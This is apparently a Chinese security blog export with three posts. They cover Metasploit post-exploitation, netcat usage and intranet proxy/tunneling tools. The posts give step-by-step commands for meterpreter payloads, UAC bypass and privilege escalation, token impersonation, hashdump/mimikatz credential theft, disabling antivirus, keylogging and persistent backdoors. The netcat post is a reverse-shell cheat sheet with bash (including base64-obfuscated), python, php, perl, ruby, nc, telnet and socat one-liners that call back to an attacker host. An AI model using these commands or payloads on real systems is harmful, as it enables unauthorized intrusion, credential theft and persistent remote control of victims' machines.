<p><strong>msfvenom -p /windows/x64/meterperter_reverse_tcp lhost=本地ip lport=本地监听端口 -f exe -o ./re.exe</strong></p>
<p><strong>（2）本地监听</strong></p>
<p>监听需要用到msf的exploit/multi/handler模块，使用show options查看需要设置的参数。重要的参数有三个：监听使用的payload、本地ip、本地监听端口。这些参数的值跟之前msfvenom使用的参数一样。</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/22032.png" alt="0"></p>
<p><strong>（3）获得回话</strong></p>
<p>将生成的exe文件或者其它类型的payload文件在目标上执行，就可以获得一个meterpreter会话，之后就可以使用msf开展后渗透测试的相关工作。</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/22034.png" alt="0"></p>
<p><strong>2.cmdshell升级为meterpreter</strong></p>
<p>如果最开始获取的是cmdshell，后来发现这台机器非常适合作为测试其它终端的跳板，这个时候cmdshell的功能已经不能满足需要，升级成meterpreter就十分有必要。</p>
<p><strong>(1)以ms17-010的利用为例，默认使用的payload返回的就是cmdshell</strong></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/21790.png" alt="0"></p>
<p><strong>(2)将该cmdshell升级成meterpreter</strong></p>
<p>命令：<strong>sessions-ucmdshell的id</strong></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/22036.png" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/22038.png" alt="0"></p>
<p><strong>(3)查看是否升级成功</strong></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/22043.png" alt="0"></p>
<p><strong>二、提权</strong></p>
<p>通常webshell的权限都比较低，能够执行的操作有限，没法查看重要文件、修改系统信息、抓取管理员密码和hash、安装特殊程序等，所以我们需要获取系统更高的权限。</p>
<p><strong>1.绕过UAC</strong></p>
<p>用户帐户控制（UAC）是微软在 Windows Vista 以后版本引入的一种安全机制，有助于防止对系统进行未经授权的更改。应用程序和任务可始终在非管理员帐户的安全上下文中运行，除非管理员专门给系统授予管理员级别的访问权限。UAC 可以阻止未经授权的应用程序进行自动安装，并防止无意中更改系统设置。</p>
<p>msf提供了如下几个模块帮助绕过UAC：</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/22047.png" alt="0"></p>
<p>以exploit/windows/local/bypassuac_eventvwr为例，其它模块的使用方法基本一致。</p>
<p><strong>(1)首先需要在meterpreter下执行background命令让当前会话保存到后台。</strong></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/22050.png" alt="0"></p>
<p><strong>(2)使用sessions命令可以查看所有后台的会话，每个session对应一个id值，后面会经常用到。</strong></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/22052.png" alt="0"></p>
<p><strong>(3)使用use exploit/windows/local/bypassuac_eventvwr命令进入该模块，使用show options查看需要设置的参数。</strong></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/22054.png" alt="0"></p>
<p><strong>(4)将参数session设置为1，直接运行exploit或者run命令，执行成功之后会返回一个新的meterpreter会话。</strong></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/22056.png" alt="0"></p>
<p><strong>(5)使用getuid命令查看当前用户，此时仍然是普通用户，再使用getsystem命令就可以提升到system权限了。</strong></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/22058.png" alt="0"></p>
<p><strong>2.利用系统漏洞提权</strong></p>
<p>无论是linux还是windows都出过很多高危的漏洞，我们可以利用它们进行权限提升，比如windows系统的ms13-081、ms15-051、ms16-032、ms17-010等，msf也集成了这些漏洞的利用模块。</p>
<p><strong>(1)使用search 补丁号进行搜索，就可以找到相关模块，以ms13-081为例。</strong></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/22060.png" alt="0"></p>
<p><strong>(2)使用use exploit/windows/local/ms13_081_track_popup_menu命令进入该模块，使用show options命令查看需要设置的参数。</strong></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/22062.png" alt="0"></p>
<p><strong>(3)使用set session 1命令设置后台的meterpreter会话id，再使用run命令运行，获取的就是SYSTEM权限。</strong></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/22064.png" alt="0"></p>
<p><strong>三、进程迁移</strong></p>
<p>当meterpreter单独作为一个进程运行时容易被发现，如果将它和系统经常运行的进程进行绑定，就能够实现持久化。</p>
<p><strong>1.查看当前会话的进程id</strong></p>
<p><strong>命令：**</strong>getpid**</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/21865.png" alt="0"></p>
<p><strong>2.查看目标运行的进程</strong></p>
<p><strong>命令：**</strong>ps**</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/21878.png" alt="0"></p>
<p><strong>3.绑定进程</strong></p>
<p><strong>命令：**</strong>migrate pid**</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/21873.png" alt="0"></p>
<p><strong>四、令牌假冒</strong></p>
<p>在用户登录windows操作系统时，系统都会给用户分配一个令牌(Token)，当用户访问系统资源时都会使用这个令牌进行身份验证，功能类似于网站的session或者cookie。</p>
<p>msf提供了一个功能模块可以让我们假冒别人的令牌，实现身份切换，如果目标环境是域环境，刚好域管理员登录过我们已经有权限的终端，那么就可以假冒成域管理员的角色。</p>
<p><strong>1.查看当前用户</strong></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/21885.png" alt="0"></p>
<p><strong>2.使用use incognito命令进入该模块</strong></p>
<p><strong>命令：**</strong>use incognito**</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/21893.png" alt="0"></p>
<p><strong>3.查看存在的令牌</strong></p>
<p><strong>命令：**</strong>list_tokens-u**</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/21897.png" alt="0"></p>
<p><strong>4.令牌假冒</strong></p>
<p><strong>命令：**</strong>impersonate_token 用户名**</p>
<p><strong>注意用户名的斜杠需要写两个。</strong></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/21906.png" alt="0"></p>
<p><strong>5.查看是否成功切换身份</strong></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/21910.png" alt="0"></p>
<p><strong>五、获取凭证</strong></p>
<p>在内网环境中，一个管理员可能管理多台服务器，他使用的密码有可能相同或者有规律，如果能够得到密码或者hash，再尝试登录内网其它服务器，可能取得意想不到的效果。</p>
<p><strong>1.使用meterpreter的run hashdump命令。</strong></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/22066.png" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/22068.png" alt="0"></p>
<p><strong>2.使用load mimikatz加载mimikatz模块，再使用help mimikatz查看支持的命令。</strong></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/21926.png" alt="0"></p>
<p><strong>3.使用wdigest命令获取登录过的用户储存在内存里的明文密码。</strong></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/21931.png" alt="0"></p>
<p><strong>六、操作文件系统</strong></p>
<p><strong>1.文件的基本操作</strong></p>
<p>ls：列出当前路径下的所有文件和文件夹。</p>
<p>pwd 或 getwd：查看当前路径。</p>
<p>search：搜索文件，使用search -h查看帮助。</p>
<p>cat：查看文件内容，比如cat test.txt。</p>
<p>edit：编辑或者创建文件。和Linux系统的vm命令类似，同样适用于目标系统是windows的情况。</p>
<p>rm：删除文件。</p>
<p>cd：切换路径。</p>
<p>mkdir：创建文件夹。</p>
<p>rmdir：删除文件夹。</p>
<p>getlwd 或 lpwd：查看自己系统的当前路径。</p>
<p>lcd：切换自己当前系统的目录。</p>
<p>lls：显示自己当前系统的所有文件和文件夹。</p>
<p><strong>2.文件的上传和下载</strong></p>
<p><strong>(1) upload</strong></p>
<p><strong>格式：**</strong>upload本地文件路径目标文件路径**</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/21941.png" alt="0"></p>
<p><strong>(2)download</strong></p>
<p><strong>格式：**</strong>download 目标文件路径 本地文件路径**</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/21947.png" alt="0"></p>
<p><strong>七、系统其它操作</strong></p>
<p><strong>1.关闭防病毒软件</strong></p>
<p><strong>run killav</strong></p>
<p><strong>run post/windows/manage/killav</strong></p>
<p><strong>2.操作远程桌面</strong></p>
<p><strong>run post/windows/manage/enable_rdp</strong>开启远程桌面</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/22091.png" alt="0"></p>
<p><strong>run post/windows/manage/enable_rdp username=test password=test</strong>添加远程桌面的用户(同时也会将该用户添加到管理员组)</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/22094.png" alt="0"></p>
<p><strong>3.截屏</strong></p>
<p>screenshot</p>
<p><strong>4.键盘记录</strong></p>
<p>keyscan_start：开启键盘记录功能</p>
<p>keyscan_dump：显示捕捉到的键盘记录信息</p>
<p>keyscan_stop：停止键盘记录功能</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/22070.png" alt="0"></p>
<p><strong>5.执行程序</strong></p>
<p><strong>execute</strong> <strong>-h 查看使用方法</strong></p>
<p>-H：创建一个隐藏进程</p>
<p>-a：传递给命令的参数</p>
<p>-i：跟进程进行交互</p>
<p>-m：从内存中执行</p>
<p>-t：使用当前伪造的线程令牌运行进程</p>
<p>-s：在给定会话中执行进程</p>
<p><strong>例：**</strong>execute -f c:/temp/hello.exe**</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/21962.png" alt="0"></p>
<p><strong>八、端口转发和内网代理</strong></p>
<p><strong>1.portfwd</strong></p>
<p>portfwd是meterpreter提供的端口转发功能，在meterpreter下使用portfwd -h命令查看该命令的参数。</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/21969.png" alt="0"></p>
<p>常用参数：</p>
<p>-l：本地监听端口</p>
<p>-r：内网目标的ip</p>
<p>-p：内网目标的端口</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/22072.png" alt="0"></p>
<p>上面命令执行之后，会将10.1.1.3的3389端口转发到本地的2222端口。</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/21977.png" alt="0"></p>
<p><strong>2.pivot</strong></p>
<p>pivot是msf最常用的代理，可以让我们使用msf提供的扫描模块对内网进行探测。</p>
<p><strong>(1)首先需要在msf的操作界面下添加一个路由表。</strong></p>
<p>添加命令：route add 内网ip 子网掩码 session的id</p>
<p><strong>打印命令：**</strong>route print**</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/22075.png" alt="0"></p>
<p>路由添加成功之后就可以在msf里访问10.1.1.0/24这个网段。</p>
<p><strong>(2)建立socks代理。</strong></p>
<p>如果其它程序需要访问这个内网环境，就可以建立socks代理。</p>
<p>msf提供了3个模块用来做socks代理。</p>
<p>auxiliary/server/socks4a</p>
<p>use auxiliary/server/socks5</p>
<p>use auxiliary/server/socks_unc</p>
<p>以auxiliary/server/socks4a为例，查看需要设置的参数。</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/22077.png" alt="0"></p>
<p>一共两个参数：</p>
<p><strong>SRVHOST：监听的ip地址，默认为0.0.0.0，一般不需要更改。</strong></p>
<p><strong>SRVPORT：监听的端口，默认为1080。</strong></p>
<p><strong>直接运行run命令，就可以成功创建一个socks4代理隧道，在linux上可以配置**</strong>proxychains<strong><strong>使用，在windows可以配置</strong></strong>Proxifier<strong>**进行使用。</strong></p>
<p><strong>九、后门</strong></p>
<p>Meterpreter的shell运行在内存中，目标重启就会失效，如果管理员给系统打上补丁，那么就没办法再次使用exploit获取权限，所以需要持久的后门对目标进行控制。</p>
<p>Msf提供了两种后门，一种是metsvc(通过服务启动)，一种是persistence(支持多种方式启动)。</p>
<p><strong>1.metsvc</strong></p>
<p><strong>(1) 使用run metsvc -h查看帮助，一共有三个参数。</strong></p>
<p>-A：安装后门后，自动启动exploit/multi/handler模块连接后门</p>
<p>-h：查看帮助</p>
<p>-r：删除后门</p>
<p><strong>(2) 安装后门</strong></p>
<p><strong>命令：**</strong>run metsvc**</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/22079.png" alt="0"></p>
<p>命令运行成功后会在C:WindowsTEMP目录下新建随机名称的文件夹，里面生成3个文件（metsvc.dll、metsvc-server.exe、metsvc.exe）。</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/22005.png" alt="0"></p>
<p>同时会新建一个服务，显示名称为Meterpreter，服务名称为metsvc，启动类型为”自动”,绑定在31337端口。</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/22081.png" alt="0"></p>
<p><strong>(3) 连接后门</strong></p>
<p>使用exploit/multi/handler模块，payload设置为windows/metsvc_bind_tcp，设置目标ip和绑定端口31337。</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/22083.png" alt="0"></p>
<p><strong>2.persistence</strong></p>
<p><strong>(1) 使用run persistence -h查看参数。</strong></p>
<p>-A：安装后门后，自动启动exploit/multi/handler模块连接后门</p>
<p>-L：自启动脚本的路径，默认为%TEMP%</p>
<p>-P：需要使用的payload，默认为windows/meterpreter/reverse_tcp</p>
<p>-S：作为一个服务在系统启动时运行（需要SYSTEM权限）</p>
<p>-T：要使用的备用可执行模板</p>
<p>-U：用户登陆时运行</p>
<p>-X：系统启动时运行</p>
<p>-i：后门每隔多少秒尝试连接服务端</p>
<p>-p：服务端监听的端口</p>
<p>-r：服务端ip</p>
<p><strong>(2) 生成后门</strong></p>
<p><strong>命令：**</strong>run persistence -X -i 10 -r 192.168.1.9 -p 4444**</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/22085.png" alt="0"></p>
<p><strong>(3) 连接后门</strong></p>
<p>使用exploit/multi/handler模块，payload设置为windows/meterpreter/reverse_tcp，同时设置好服务端监听ip和端口。</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/22087.png" alt="0"></p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>MSF</tag>
        <tag>后渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>nc使用详解</title>
    <url>/2020/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/nc%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<h2 id="NC概述"><a href="#NC概述" class="headerlink" title="NC概述:"></a>NC概述:</h2><ul>
<li>nc又名netcat，一个简单而有用的工具，可以干很多事情，但是不可以吃。</li>
<li>何为反弹shell？为什么不反弹攻击?<br>相信你有一天可以直接把所有攻击反弹回去的.</li>
</ul>
<p><strong>常用命令</strong></p>
<p>banner获取</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -nv ip port</span><br></pre></td></tr></table></figure>

<p>连接远程主机</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -nvv ip port</span><br></pre></td></tr></table></figure>

<p>端口扫描</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -v ip port            &#x2F;&#x2F;指定端口</span><br><span class="line">nc -v -z  ip 1-1555         &#x2F;&#x2F;指定端口段</span><br></pre></td></tr></table></figure>

<p>文件传输</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc  -lvp  8888 &lt; test.txt  服务端</span><br><span class="line">nc -nv 服务端ip 8888 &gt; test.txt 客户端</span><br></pre></td></tr></table></figure>

<h1 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h1><p>正向shell：客户端想要获取服务器shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">	客户端监听</span><br><span class="line">nc -lvp 8888 -e &#x2F;bin&#x2F;sh </span><br><span class="line">nc -lvp 8888 -e c:\windows\system32\cmd.exe </span><br><span class="line">	服务端反弹</span><br><span class="line">	nc 服务端ip 8888</span><br></pre></td></tr></table></figure>

<p>反向shell：服务端想要获取客户端器shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">客户端监听</span><br><span class="line">nc -lvp 8888 </span><br><span class="line">服务端反弹</span><br><span class="line">nc ip 8888 -e &#x2F;bin&#x2F;sh </span><br><span class="line">nc ip 8888 -e c:\windows\system32\cmd.exe </span><br></pre></td></tr></table></figure>

<p>没有nc是，由于各种环境不同，可以结合天时地利人和。</p>
<ul>
<li>Bash</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1</span><br><span class="line">base64版 </span><br><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEzNy4xMzUvNzg5MCAwPiYx|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39;</span><br><span class="line">123</span><br></pre></td></tr></table></figure>

<ul>
<li>python</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &quot;import os,socket,subprocess;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;ip&#39;,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-i&#39;]);&quot;</span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<ul>
<li>php</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php -r &#39;$sock&#x3D;fsockopen(&quot;ip&quot;,port);exec(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<ul>
<li>perl</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Socket;$i&#x3D;&quot;ip&quot;;$p&#x3D;port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;sh -i&quot;);&#125;;&#39;</span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<ul>
<li>ruby</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ruby -rsocket -e&#39;f&#x3D;TCPSocket.open(&quot;ip&quot;,port).to_i;exec sprintf(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;</span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<ul>
<li>nc反弹nc</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -e &#x2F;bin&#x2F;bash ip port</span><br></pre></td></tr></table></figure>

<ul>
<li>Netcat</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc ip port &gt;&#x2F;tmp&#x2F;f</span><br></pre></td></tr></table></figure>

<ul>
<li>Telnet</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">TF&#x3D;$(mktemp -u); mkfifo $TF &amp;&amp; telnet ip port 0&lt;$TF | &#x2F;bin&#x2F;sh 1&gt;$TF</span><br></pre></td></tr></table></figure>

<p>socat</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp:106.xxx.xxx.115:9999</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
        <tag>NC</tag>
      </tags>
  </entry>
  <entry>
    <title>代理转发</title>
    <url>/2020/09/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/</url>
    <content><![CDATA[<h2 id="概念："><a href="#概念：" class="headerlink" title="概念："></a>概念：</h2><p>代理转发就是将一个端口，端口可以为主机端口也可以是访问到的人以主机的端口，转发到任意一台可以访问到的IP上</p>
<h2 id="区分正向连接和反向连接"><a href="#区分正向连接和反向连接" class="headerlink" title="区分正向连接和反向连接"></a>区分正向连接和反向连接</h2><ul>
<li>正向连接：你的机器连接目标机器</li>
<li>反向连接：目标机器反连你的机器（当防火墙设置端口过滤的话使用）</li>
<li>不论映射，还是转发，都有正有反，原理相同</li>
</ul>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/getImage-20200913231620854.png" alt="img"></p>
<h2 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h2><h3 id="NC"><a href="#NC" class="headerlink" title="NC"></a>NC</h3><p>nc的正向连接：</p>
<p>  在公网服务器上监听他的cmd.exe 命令为：nc.exe -l -p 4444 -e cmd.exe</p>
<p>  在攻击者上监听nc -vv 公网服务器ip 4444</p>
<p>  可以获取到公网服务器的cmd</p>
<p>nc的反向代理：</p>
<p>  在公网服务器上监听自己的4444端口：nc.exe -lvp 4444</p>
<p>  在内网主机中进行：nc -t -e cmd.exe 公网ip 4444</p>
<p>  公网可成功获取内网cmd</p>
<h3 id="LCX"><a href="#LCX" class="headerlink" title="LCX"></a>LCX</h3><p>LCX的内网端口转发（防火墙做过滤不允许别人连接自己的3389）</p>
<p>  内网执行lcx.exe -slave 公网ip 4444 127.0.0.1 3389  内网将自己的3389端口转发到公网的4444端口</p>
<p>  公网主机监听自己端口 lcx.exe -listen 4444 5555</p>
<p>则攻击者连接公网ip的5555端口即可连接上内网的3389</p>
<p>LCX的本地端口转发（防火墙做过滤不允许自己的3389连接出去）</p>
<p>  防火墙限制，部分端口无法通过防火墙，可以将目标主机的3389端口传到允许的其他端口比如53，则在目标主机执行：lcx -tran 53 目标主机ip 3389</p>
<p>  可以直接连接目标主机的ip:53</p>
<h3 id="ew做代理"><a href="#ew做代理" class="headerlink" title="ew做代理"></a>ew做代理</h3><p>①<strong>首先在VPS上做相应的代理监听：</strong></p>
<p><strong>./ew_for_Linux32 -s rcsocks -l 1008 -e 888</strong></p>
<p><strong>在VPS上 监听888端口 并加端口转发给 本地的 1008端口</strong></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/19627.png" alt="0"></p>
<p>② <strong>在客户端(内网环境)连接VPS的888端口</strong></p>
<p><strong>ew_for_Win.exe -s rssocks -d 104.224.150.102 -e 888</strong></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/19653.png" alt="0"></p>
<p>🌂<strong>利用相应的代理软件 来监听 VPS的1008端口既可以进行内网穿透式连接</strong></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/19655.png" alt="0"></p>
<h3 id="利用frp做代理"><a href="#利用frp做代理" class="headerlink" title="利用frp做代理"></a>利用frp做代理</h3><p>download：<a href="https://github.com/fatedier/frp/releases">https://github.com/fatedier/frp/releases</a></p>
<p>①<strong>首先在VPS上做如下配置：</strong></p>
<p><strong>修改 frps.ini</strong></p>
<p><strong>bind_port = 8080</strong></p>
<p><strong>privilege_token = pentest999</strong></p>
<p><strong>运行 nohup ./frps -c frps.ini &amp;</strong></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/19664.png" alt="0"></p>
<p>②<strong>在客户端上做如下配置：</strong></p>
<p><strong>修改 frpc.ini</strong></p>
<p><strong>[common]</strong></p>
<p><strong>server_addr = vps ip</strong></p>
<p><strong>server_port = 8080</strong></p>
<p><strong>privilege_token = pentest999</strong></p>
<p><strong>[plugin_socks5]</strong></p>
<p><strong>type = tcp</strong></p>
<p><strong>remote_port = 8081</strong></p>
<p><strong>plugin = socks5</strong></p>
<p><strong>plugin_user = ptest33333</strong></p>
<p><strong>plugin_passwd = ptest66666</strong></p>
<p><strong>运行 frpc -c fprc.ini</strong></p>
<p><strong>🌂利用相应的socks5代理连接 VPS的 8081端口即可</strong></p>
<h3 id="ssh-隧道代理转发"><a href="#ssh-隧道代理转发" class="headerlink" title="ssh 隧道代理转发"></a>ssh 隧道代理转发</h3><p>ssh 有三个强大的端口转发命令，分别是本地转发、远程转发、动态转发。</p>
<p>本地访问127.0.0.1:port1就是host:port2(用的更多)<br><code>ssh -CfNg -L port1:127.0.0.1:port2 user@host</code> #本地转发<br>访问host:port2就是访问127.0.0.1:port1<br><code>ssh -CfNg -R port2:127.0.0.1:port1 user@host</code> #远程转发<br>可以将dmz_host的hostport端口通过remote_ip转发到本地的port端口<br><code>ssh -qTfnN -L port:dmz_host:hostport -l user remote_ip</code> #正向隧道 监听本地port 可以将dmz_host的hostport端口转发到remote_ip的port端口<br><code>ssh -qTfnN -R port:dmz_host:hostport -l user remote_ip</code> #反向隧道<br>用于内网穿透防火墙限制之类<br>socket 代理: <code>ssh -qTfnN -D port remotehost</code></p>
<h3 id="毒刺Stinger进行端口转发"><a href="#毒刺Stinger进行端口转发" class="headerlink" title="毒刺Stinger进行端口转发"></a>毒刺Stinger进行端口转发</h3><p><strong>端口转发</strong></p>
<ol>
<li>将stinger_server和proxy.php上传到目标服务器,确保 <a href="http://192.168.1.106:81/proxy.php可以访问,页面返回">http://192.168.1.106:81/proxy.php可以访问,页面返回</a> stinger XXX!</li>
<li>目标服务器执行如下命令启动代理服务(使用菜刀执行命令时可以添加start /b 或&amp; 后台运行,确保服务端7000端口未被占用)</li>
</ol>
<p>PS C:\Users\test\Desktop&gt; .\stinger_server_win_x64.exe -listen 127.0.0.1:7000 -username test -password testpass</p>
<ol>
<li>本地PC执行如下命令连接代理脚本</li>
</ol>
<p>stinger_client_win_x64.exe -local 127.0.0.1:1080 -proxy_server <a href="http://192.168.1.106:81/proxy.php">http://192.168.1.106:81/proxy.php</a> -remote_server <a href="http://127.0.0.1:7000">http://127.0.0.1:7000</a> -remote 127.0.0.1:3389 -username test -password testpass</p>
<ol>
<li>此时已经将192.168.1.106的3389端口映射到了你本地pc的1080端口</li>
</ol>
<p><strong>SOCK5代理</strong></p>
<ol>
<li>将stinger_server和proxy.php上传到目标服务器,确保 <a href="http://192.168.1.106:81/proxy.php可以访问,页面返回">http://192.168.1.106:81/proxy.php可以访问,页面返回</a> stinger XXX!</li>
<li>目标服务器执行如下命令启动代理服务(使用菜刀执行命令时可以添加start /b 或&amp; 后台运行,确保服务端7000,8000端口未被占用)</li>
</ol>
<p>PS C:\Users\test\Desktop&gt; .\stinger_server_win_x64.exe -listen 127.0.0.1:7000 -username test -password testpass -socks5Addr 127.0.0.1:8000</p>
<ol>
<li>本地PC执行如下命令连接代理脚本</li>
</ol>
<p>stinger_client_win_x64.exe -local 127.0.0.1:1080 -proxy_server <a href="http://192.168.1.106:81/proxy.php">http://192.168.1.106:81/proxy.php</a> -remote_server <a href="http://127.0.0.1:7000">http://127.0.0.1:7000</a> -remote 127.0.0.1:8000 -username test -password testpass</p>
<ol>
<li>此时你本地PC已经在1080生成一个SOCKS5代理,可以使用该代理访问目标内网</li>
</ol>
<p><strong>已测试</strong></p>
<p><strong>stinger_server\stinger_client</strong></p>
<ul>
<li>windows</li>
<li>linux</li>
</ul>
<p><strong>proxy.jsp/php/aspx</strong></p>
<ul>
<li>php7.2</li>
<li>tomcat7.0</li>
<li>iis8.0</li>
</ul>
<p><strong>已知问题</strong></p>
<ul>
<li>client端的socket连接无法自动释放</li>
</ul>
<p><strong>结语</strong></p>
<ul>
<li>php是最好的语言</li>
<li>啊D是最好的渗透测试工具</li>
</ul>
<h3 id="reGeorg端口转发"><a href="#reGeorg端口转发" class="headerlink" title="reGeorg端口转发"></a>reGeorg端口转发</h3><p>reGeorg不用多介绍了，内网渗透中常用工具之一。小白经常用于渗透测试中的内网转发，主要是因为方便实用。这个工具需要配合</p>
<p>proxifier,使用的socks5代理进行运用的。标红的是我们需要的脚本，根据自己的需要结合实际测试环境来选用的。 </p>
<p>首先我们现经代理脚本上传到服务器，实验的环境是jsp的，所以上传代理脚本tunnel.nosocket.jsp，然后我们在浏览器访问一下，如果出现以下提示就说明代理成功。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200913233151005.png" alt="image-20200913233151005"></p>
<p>上传代理脚本成功后，我们打开proxifier进行配置参数，代理的端口默认是8888，代理的规则我们设置为谷歌浏览器，如果其它的不需要可以去掉勾：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200913233205362.png" alt="image-20200913233205362"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200913233216450.png" alt="image-20200913233216450"></p>
